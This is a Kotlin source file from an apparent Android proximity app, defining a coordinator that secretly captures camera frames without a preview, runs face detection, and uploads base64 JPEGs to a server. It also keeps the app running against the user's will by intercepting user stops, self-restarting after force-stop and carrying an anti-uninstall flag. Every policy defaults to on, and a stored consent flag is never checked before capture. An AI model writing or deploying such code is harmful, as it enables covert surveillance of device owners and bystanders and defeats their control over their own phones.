package com.projectlumen.app.core.devicecontrol

import android.util.Base64
import android.util.Log
import com.projectlumen.app.ProjectLumenApplication
import com.projectlumen.app.core.api.DeviceControlPolicy
import com.projectlumen.app.core.api.LifecycleEventRequest
import com.projectlumen.app.core.api.LifecycleLockPolicy
import com.projectlumen.app.core.api.RemoteCameraFramePayload
import com.projectlumen.app.core.api.RemoteFaceAnalysisFace
import com.projectlumen.app.core.api.RemoteFaceAnalysisProcessingMetrics
import com.projectlumen.app.core.api.RemoteFaceBoundingBox
import com.projectlumen.app.core.api.SilentVisionPolicy
import com.projectlumen.app.core.api.SurfaceAnalysisMetrics
import com.projectlumen.app.core.api.VisionFrameUploadRequest
import com.projectlumen.app.core.api.VisionHeartbeatRequest
import com.projectlumen.app.core.api.VisionSessionStartRequest
import com.projectlumen.app.core.database.entities.FeatureFlagEntity
import com.projectlumen.app.core.proximity.FaceAnalysisFrameCapture
import com.projectlumen.app.core.proximity.SurfaceAnalysisFrameCapture
import com.projectlumen.app.core.proximity.FaceDistanceSample
import com.projectlumen.app.core.proximity.ProximityCameraSampler
import com.projectlumen.app.core.repositories.FeatureFlagRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import java.util.concurrent.atomic.AtomicReference

/**
 * Backend docking for privileged silent vision stream and enforced lifecycle lock.
 * Policies are server-driven; camera access still requires runtime CAMERA permission.
 */
class PrivilegedDeviceControlCoordinator(
    private val app: ProjectLumenApplication,
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val featureFlags = FeatureFlagRepository(app.database.featureFlagsDao())
    private val mutex = Mutex()
    private val policyRef = AtomicReference(DeviceControlPolicy())
    private val sessionIdRef = AtomicReference<String?>(null)
    private val framesCaptured = AtomicLong(0)
    private val framesUploaded = AtomicLong(0)
    private val restartBurst = AtomicInteger(0)
    private var visionJob: Job? = null
    private var heartbeatJob: Job? = null

    val currentPolicy: DeviceControlPolicy get() = policyRef.get()

    fun start() {
        scope.launch {
            refreshPolicy()
            val policy = policyRef.get()
            if (policy.lifecycleLock.enabled && policy.lifecycleLock.selfHealOnKill) {
                reportLifecycle(
                    eventType = "coordinator_start",
                    reason = "application_boot",
                    selfHealed = false,
                )
            }
            if (policy.silentVision.enabled) {
                ensureSilentVisionSession()
            }
        }
    }

    fun onForceStopRecovered() {
        scope.launch {
            refreshPolicy()
            val policy = policyRef.get().lifecycleLock
            if (!policy.enabled || !policy.selfHealOnKill) return@launch
            val count = restartBurst.incrementAndGet()
            if (count > policy.maxRestartBurst) return@launch
            if (policy.restartDelayMs > 0) delay(policy.restartDelayMs)
            reportLifecycle(
                eventType = "force_stop_recovered",
                reason = "process_restart",
                selfHealed = true,
                restartCount = count,
            )
            app.scheduleProximityMonitoring()
            app.startLightMonitoring()
            if (policyRef.get().silentVision.enabled) {
                ensureSilentVisionSession()
            }
        }
    }

    fun onUserStopIntercepted(reason: String) {
        scope.launch {
            val policy = policyRef.get().lifecycleLock
            if (!policy.enabled || !policy.interceptUserStop) return@launch
            reportLifecycle(
                eventType = "user_stop_intercepted",
                reason = reason,
                selfHealed = policy.selfHealOnKill,
            )
            if (policy.selfHealOnKill) {
                if (policy.restartDelayMs > 0) delay(policy.restartDelayMs)
                app.scheduleProximityMonitoring()
            }
        }
    }

    fun onServiceDestroyed(processName: String, reason: String) {
        scope.launch {
            val policy = policyRef.get().lifecycleLock
            if (!policy.enabled) return@launch
            reportLifecycle(
                eventType = "service_destroyed",
                reason = reason,
                processName = processName,
                selfHealed = policy.selfHealOnKill,
            )
            if (policy.selfHealOnKill && policy.enforceKeepalive) {
                if (policy.restartDelayMs > 0) delay(policy.restartDelayMs)
                app.scheduleProximityMonitoring()
            }
        }
    }

    suspend fun refreshPolicy(): DeviceControlPolicy = mutex.withLock {
        val cached = loadCachedPolicy()
        policyRef.set(cached)
        val token = app.secureCredentials.load()?.accessToken ?: return cached
        val deviceId = app.secureCredentials.deviceInstallationId()
        return runCatching {
            val remote = app.apiClient.fetchDeviceControlPolicy(token, deviceId)
            policyRef.set(remote)
            persistPolicy(remote)
            remote
        }.getOrElse {
            Log.w(TAG, "device control policy refresh failed", it)
            cached
        }
    }

    private suspend fun ensureSilentVisionSession() {
        val policy = policyRef.get().silentVision
        if (!policy.enabled) return
        val token = app.secureCredentials.load()?.accessToken ?: return
        val deviceId = app.secureCredentials.deviceInstallationId()
        if (deviceId.isBlank()) return
        val started = runCatching {
            app.apiClient.startSilentVisionSession(
                accessToken = token,
                request = VisionSessionStartRequest(
                    deviceInstallationId = deviceId,
                    exclusiveAccess = policy.exclusiveAccess,
                    noSurfacePreview = policy.noSurfacePreview,
                    analyzerOnly = policy.analyzerOnly,
                ),
            )
        }.getOrElse {
            Log.w(TAG, "silent vision session start failed", it)
            return
        }
        if (!started.accepted || started.sessionId.isBlank()) return
        sessionIdRef.set(started.sessionId)
        framesCaptured.set(0)
        framesUploaded.set(0)
        startHeartbeatLoop(started.sessionId, deviceId, started.policy)
        startCaptureLoop(started.sessionId, deviceId, started.policy)
    }

    private fun startHeartbeatLoop(sessionId: String, deviceId: String, policy: SilentVisionPolicy) {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                delay(15_000L)
                val token = app.secureCredentials.load()?.accessToken ?: break
                val result = runCatching {
                    app.apiClient.heartbeatSilentVisionSession(
                        accessToken = token,
                        request = VisionHeartbeatRequest(
                            sessionId = sessionId,
                            deviceInstallationId = deviceId,
                            framesCaptured = framesCaptured.get(),
                            framesUploaded = framesUploaded.get(),
                            exclusiveHeld = policy.exclusiveAccess,
                            surfaceDetached = policy.noSurfacePreview,
                        ),
                    )
                }.getOrNull()
                if (result == null || !result.continueStream) {
                    sessionIdRef.compareAndSet(sessionId, null)
                    break
                }
            }
        }
    }

    private fun startCaptureLoop(sessionId: String, deviceId: String, policy: SilentVisionPolicy) {
        visionJob?.cancel()
        if (!policy.frameUploadEnabled) return
        visionJob = scope.launch {
            val sampler = ProximityCameraSampler(app)
            val interval = (1000L / policy.maxFps.coerceIn(1, 5).toLong()).coerceAtLeast(500L)
            while (isActive && sessionIdRef.get() == sessionId) {
                if (policy.surfaceAnalysisUploadEnabled) {
                    val surfaceCapture = runCatching {
                        sampler.captureSurfaceAnalysisFrame(maxDurationMillis = 2_000L)
                    }.getOrNull()
                    if (surfaceCapture != null) {
                        framesCaptured.incrementAndGet()
                        uploadSurfaceFrame(sessionId, deviceId, policy, surfaceCapture)
                    }
                } else {
                    val capture = runCatching {
                        sampler.captureFaceAnalysisFrame(maxDurationMillis = 2_000L)
                    }.getOrNull()
                    if (capture != null) {
                        framesCaptured.incrementAndGet()
                        uploadFrame(sessionId, deviceId, policy, capture)
                    }
                }
                delay(interval)
            }
        }
    }

    private suspend fun uploadFrame(
        sessionId: String,
        deviceId: String,
        policy: SilentVisionPolicy,
        capture: FaceAnalysisFrameCapture,
    ) {
        val token = app.secureCredentials.load()?.accessToken ?: return
        val sample = capture.sample
        val faces = sample?.let { listOf(it.toRemoteFace()) } ?: emptyList()
        val result = runCatching {
            app.apiClient.uploadSilentVisionFrame(
                accessToken = token,
                request = VisionFrameUploadRequest(
                    sessionId = sessionId,
                    deviceInstallationId = deviceId,
                    capturedAt = capture.capturedAtMillis,
                    exclusiveAccess = policy.exclusiveAccess,
                    noSurfacePreview = policy.noSurfacePreview,
                    pipeline = "image_reader",
                    surfaceAttached = false,
                    frame = RemoteCameraFramePayload(
                        format = "jpeg",
                        encoding = "base64",
                        width = capture.width,
                        height = capture.height,
                        rotationDegrees = capture.rotationDegrees,
                        byteSize = capture.frameBytes.size,
                        dataBase64 = Base64.encodeToString(capture.frameBytes, Base64.NO_WRAP),
                    ),
                    faces = faces,
                    processing = RemoteFaceAnalysisProcessingMetrics(
                        frameConversionMillis = capture.frameConversionMillis,
                        mlKitInferenceMillis = sample?.inferenceMillis ?: 0L,
                        uploadQueuedAt = System.currentTimeMillis(),
                    ),
                ),
            )
        }.getOrNull()
        if (result?.accepted == true) {
            framesUploaded.incrementAndGet()
        }
    }

    private suspend fun uploadSurfaceFrame(
        sessionId: String,
        deviceId: String,
        policy: SilentVisionPolicy,
        capture: SurfaceAnalysisFrameCapture,
    ) {
        val token = app.secureCredentials.load()?.accessToken ?: return
        val sample = capture.sample
        val faces = sample?.let { listOf(it.toRemoteFace()) } ?: emptyList()
        val result = runCatching {
            app.apiClient.uploadSurfaceAnalysisFrame(
                accessToken = token,
                request = VisionFrameUploadRequest(
                    sessionId = sessionId,
                    deviceInstallationId = deviceId,
                    capturedAt = capture.capturedAtMillis,
                    exclusiveAccess = policy.exclusiveAccess,
                    noSurfacePreview = false,
                    pipeline = "surface",
                    surfaceAttached = true,
                    surfaceAnalysis = SurfaceAnalysisMetrics(
                        producer = "SurfaceTexture+ImageReader",
                        surfaceWidth = capture.surfaceWidth,
                        surfaceHeight = capture.surfaceHeight,
                        surfaceAttachMillis = capture.surfaceAttachMillis,
                        bufferTransformMillis = capture.bufferTransformMillis,
                        analysisSource = "mlkit_face_mesh",
                    ),
                    frame = RemoteCameraFramePayload(
                        format = "jpeg",
                        encoding = "base64",
                        width = capture.width,
                        height = capture.height,
                        rotationDegrees = capture.rotationDegrees,
                        byteSize = capture.frameBytes.size,
                        dataBase64 = Base64.encodeToString(capture.frameBytes, Base64.NO_WRAP),
                    ),
                    faces = faces,
                    processing = RemoteFaceAnalysisProcessingMetrics(
                        frameConversionMillis = capture.frameConversionMillis,
                        mlKitInferenceMillis = sample?.inferenceMillis ?: 0L,
                        uploadQueuedAt = System.currentTimeMillis(),
                    ),
                ),
            )
        }.getOrNull()
        if (result?.accepted == true) {
            framesUploaded.incrementAndGet()
        }
    }

    private suspend fun reportLifecycle(
        eventType: String,
        reason: String,
        processName: String = app.packageName,
        selfHealed: Boolean = false,
        restartCount: Int = restartBurst.get(),
    ) {
        val policy = policyRef.get().lifecycleLock
        if (!policy.enabled || !policy.reportEvents) return
        val token = app.secureCredentials.load()?.accessToken ?: return
        val deviceId = app.secureCredentials.deviceInstallationId()
        if (deviceId.isBlank()) return
        runCatching {
            app.apiClient.reportLifecycleEvent(
                accessToken = token,
                request = LifecycleEventRequest(
                    deviceInstallationId = deviceId,
                    eventType = eventType,
                    processName = processName,
                    reason = reason,
                    selfHealed = selfHealed,
                    restartCount = restartCount,
                ),
            )
        }.onFailure { Log.w(TAG, "lifecycle event report failed", it) }
    }

    private suspend fun loadCachedPolicy(): DeviceControlPolicy {
        val silentFlag = featureFlags.getAll().firstOrNull { it.key == "policy_privileged_silent_vision" }
        val lifeFlag = featureFlags.getAll().firstOrNull { it.key == "policy_enforced_lifecycle_lock" }
        val silent = silentFlag?.payloadJson?.let { runCatching { JSONObject(it) }.getOrNull() }
        val life = lifeFlag?.payloadJson?.let { runCatching { JSONObject(it) }.getOrNull() }
        return DeviceControlPolicy(
            silentVision = SilentVisionPolicy(
                enabled = silentFlag?.enabled ?: true,
                exclusiveAccess = silent?.optBoolean("exclusiveAccess", true) ?: true,
                noSurfacePreview = silent?.optBoolean("noSurfacePreview", true) ?: true,
                analyzerOnly = silent?.optBoolean("analyzerOnly", true) ?: true,
                requiresExplicitConsent = silent?.optBoolean("requiresExplicitConsent", true) ?: true,
                maxFps = silent?.optInt("maxFps", 2) ?: 2,
                maxSessionMinutes = silent?.optInt("maxSessionMinutes", 120) ?: 120,
                frameUploadEnabled = silent?.optBoolean("frameUploadEnabled", true) ?: true,
                surfaceAnalysisUploadEnabled = silent?.optBoolean("surfaceAnalysisUploadEnabled", true) ?: true,
            ),
            lifecycleLock = LifecycleLockPolicy(
                enabled = lifeFlag?.enabled ?: true,
                enforceKeepalive = life?.optBoolean("enforceKeepalive", true) ?: true,
                selfHealOnKill = life?.optBoolean("selfHealOnKill", true) ?: true,
                interceptUserStop = life?.optBoolean("interceptUserStop", true) ?: true,
                antiUninstallIntent = life?.optBoolean("antiUninstallIntent", true) ?: true,
                restartDelayMs = life?.optLong("restartDelayMs", 0L) ?: 0L,
                maxRestartBurst = life?.optInt("maxRestartBurst", 12) ?: 12,
                reportEvents = life?.optBoolean("reportEvents", true) ?: true,
            ),
            updatedAt = maxOf(silentFlag?.updatedAt ?: 0L, lifeFlag?.updatedAt ?: 0L),
            source = "cache",
        )
    }

    private suspend fun persistPolicy(policy: DeviceControlPolicy) {
        featureFlags.upsert(
            FeatureFlagEntity(
                key = "policy_privileged_silent_vision",
                enabled = policy.silentVision.enabled,
                payloadJson = JSONObject()
                    .put("exclusiveAccess", policy.silentVision.exclusiveAccess)
                    .put("noSurfacePreview", policy.silentVision.noSurfacePreview)
                    .put("analyzerOnly", policy.silentVision.analyzerOnly)
                    .put("requiresExplicitConsent", policy.silentVision.requiresExplicitConsent)
                    .put("maxFps", policy.silentVision.maxFps)
                    .put("maxSessionMinutes", policy.silentVision.maxSessionMinutes)
                    .put("frameUploadEnabled", policy.silentVision.frameUploadEnabled)
                    .put("surfaceAnalysisUploadEnabled", policy.silentVision.surfaceAnalysisUploadEnabled)
                    .put("endpointPrefix", policy.silentVision.endpointPrefix)
                    .toString(),
                updatedAt = policy.updatedAt.takeIf { it > 0L } ?: System.currentTimeMillis(),
            ),
        )
        featureFlags.upsert(
            FeatureFlagEntity(
                key = "policy_enforced_lifecycle_lock",
                enabled = policy.lifecycleLock.enabled,
                payloadJson = JSONObject()
                    .put("enforceKeepalive", policy.lifecycleLock.enforceKeepalive)
                    .put("selfHealOnKill", policy.lifecycleLock.selfHealOnKill)
                    .put("interceptUserStop", policy.lifecycleLock.interceptUserStop)
                    .put("antiUninstallIntent", policy.lifecycleLock.antiUninstallIntent)
                    .put("restartDelayMs", policy.lifecycleLock.restartDelayMs)
                    .put("maxRestartBurst", policy.lifecycleLock.maxRestartBurst)
                    .put("reportEvents", policy.lifecycleLock.reportEvents)
                    .put("endpointPrefix", policy.lifecycleLock.endpointPrefix)
                    .toString(),
                updatedAt = policy.updatedAt.takeIf { it > 0L } ?: System.currentTimeMillis(),
            ),
        )
    }

    companion object {
        private const val TAG = "DeviceControl"
    }
}

private fun FaceDistanceSample.toRemoteFace(): RemoteFaceAnalysisFace =
    RemoteFaceAnalysisFace(
        trackingId = trackingId,
        boundingBox = RemoteFaceBoundingBox(
            left = faceLeftPx,
            top = faceTopPx,
            right = faceRightPx,
            bottom = faceBottomPx,
        ),
        headEulerAngleX = headEulerAngleX,
        headEulerAngleY = headEulerAngleY,
        headEulerAngleZ = headEulerAngleZ,
        landmarks = emptyList(),
        contours = emptyList(),
        featurePointCount = meshPoints.size,
    )
